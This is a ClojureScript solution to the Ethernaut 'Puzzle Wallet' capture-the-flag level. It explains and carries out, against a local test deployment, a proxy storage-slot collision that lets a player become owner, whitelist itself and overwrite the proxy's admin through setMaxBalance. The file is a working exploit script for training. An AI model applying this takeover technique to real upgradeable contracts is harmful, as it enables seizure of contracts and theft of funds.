(ns ctf.ethernaut.puzzle-wallet
  "Upgradeable Proxies uses `delegatecall` under the hood.
  in a `delegatecall` execution in the EVM, caller's storage is
  used with callee's code.

  Storage slot #0 in the caller is `pendingAdmin`, in callee
  it is `owner`.

  Storage slot #1 in the caller `admin`, in callee
  it is `maxBalance`.

  1. if we call `proposeNewAdmin` with player's address, whenever
  the wallet contract tries to access `owner` it will get the
  value of `pendingAdmin` (player's address).

  2. Step 1 makes player practically the wallet contract. As an
  owner it can add itself to whitelist by calling `addToWhitelist`.

  3. Finally, since player is now white listed, it can call
  `setMaxBalance` function with its own address (implicit cast to uint256).
   This step will make the wallet contract update the storage of
   proxy contract at the slot where `admin` is stored."
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-puzzle-wallet!
  "Deploys the PuzzleWallet (_implementation) contract
  using Owner's wallet! Returns the `js/Promise`."
  []
  (let [contract (u/contract
                  :puzzle-wallet/wallet
                  w/local-wallet)]
    (.deploy contract)))


(defn wallet-initializer
  "Wallet contract is meant to be used with an upgradeable proxy.
  It cannot have a constructor. Instead it has an `init` function
  to initialize state of the wallet (attached to proxy's storage)."
  [wallet-iface]
  (.encodeFunctionData
   wallet-iface
   (.getFunction
    wallet-iface
    "init")
   ;; arguments for init function
   (clj->js [42])))


(defn deploy-puzzle-proxy!
  "Deploys the attacker contract using players' wallet!
   Returns the `js/Promise`."
  [admin-addr impl-addr data]
  (let [contract (u/contract
                  :puzzle-wallet/proxy
                  w/local-wallet)]
    (.deploy contract
             admin-addr
             impl-addr
             data)))

(defn puzzle-wallet-attack
  []
  (try-async
   [wallet         (<p! (deploy-puzzle-wallet!))
    proxy          (<p!
                    (deploy-puzzle-proxy!
                     (.-address w/local-wallet)
                     (.-address wallet)
                     (wallet-initializer
                      (.-interface wallet))))
    proxy-instance (.attach wallet (.-address proxy))]
   (do
     (<p!
      (.proposeNewAdmin (.connect proxy player)
                        (.-address player)))
     (<p!
      (.addToWhitelist (.connect proxy-instance player)
                       (.-address player)))
     (<p!
      (.setMaxBalance
       (.connect proxy-instance player)
       (.-address player)))
     (<p! (.admin proxy)))))



(comment

  ;; Execute this code to override the storage
  ;; new admin will be printed (should be equal to player's addr)
  (a/take! (puzzle-wallet-attack)
           #(prn %))

  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (def puzzle-wallet (atom ""))
  (-> (deploy-puzzle-wallet!)
      (.then #(reset! puzzle-wallet %))
      (.catch #(.log js/console %)))

  (def fragment
    (.getFunction (.-interface @puzzle-wallet) "init"))
  ;; ^^ fragment

  #_(def args (clj->js [(.-address w/local-wallet)
                      (.-address @puzzle-wallet)]))
  (def args (clj->js [42]))
  ;; ^^ args

  ;; contractInterface.encodeFunctionData(fragment, args);
  (def data
    (.encodeFunctionData
     (.-interface @puzzle-wallet)
     fragment
     args))

  (def puzzle-proxy (atom ""))
  (-> (deploy-puzzle-proxy!
       (.-address w/local-wallet)
       (.-address @puzzle-wallet)
       data)
      (.then #(reset! puzzle-proxy %))
      (.catch #(.log js/console %)))


  ;; attack the proxy to the wallet
  (def proxy-instance
    (.attach @puzzle-wallet
             (.-address @puzzle-proxy)))


  (-> (.owner proxy-instance)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  (-> (.maxBalance proxy-instance)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  (-> (.whitelisted proxy-instance
                    (.-address player))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.admin @puzzle-proxy)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  ;; become owner for proxy->wallet
  (-> (.proposeNewAdmin
       (.connect @puzzle-proxy player)
       (.-address player))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  ;; add yourself to whitelist
  (-> (.addToWhitelist
       (.connect proxy-instance player)
       (.-address player))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  ;; check if player is now in white list
  (-> (.whitelisted proxy-instance
                    (.-address player))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  ;; send player's address in SetMaxBalance to become admin
  (-> (.setMaxBalance
       (.connect proxy-instance player)
       (.-address player))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  ;; check admin
  (-> (.admin @puzzle-proxy)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

 )
